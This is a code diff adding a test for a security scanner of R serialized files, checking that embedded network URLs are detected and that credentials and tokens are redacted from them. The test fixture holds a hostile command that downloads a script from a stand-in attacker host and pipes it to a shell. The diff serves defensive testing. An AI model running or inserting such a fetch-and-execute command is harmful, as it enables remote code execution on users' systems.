@@ -145,6 +145,33 @@ def test_scan_detects_malicious_expression_and_bypass_noise(tmp_path: Path) -> N
     assert credential_checks[0].status == CheckStatus.FAILED
 
 
+def test_scan_redacts_embedded_network_indicator_urls(tmp_path: Path) -> None:
+    path = tmp_path / "malicious.rds"
+    _write_raw_r_serialized(
+        path,
+        "\n".join(
+            [
+                "expression",
+                (
+                    "base::system('curl "
+                    "https://user:pass@evil.example/payload.sh?token=SECRET_TOKEN#SECRET_FRAGMENT | sh')"
+                ),
+            ]
+        ),
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    network_checks = _check_by_name(result, "Embedded Network Indicator Detection")
+    assert len(network_checks) == 1
+    details = network_checks[0].details
+    assert details["urls"] == ["https://evil.example/payload.sh"]
+    assert "user" not in str(details)
+    assert "pass" not in str(details)
+    assert "SECRET_TOKEN" not in str(details)
+    assert "SECRET_FRAGMENT" not in str(details)
+
+
 def test_scan_doc_heavy_content_with_risky_words_is_not_critical(tmp_path: Path) -> None:
     path = tmp_path / "docs_only.rds"
     _write_raw_r_serialized(
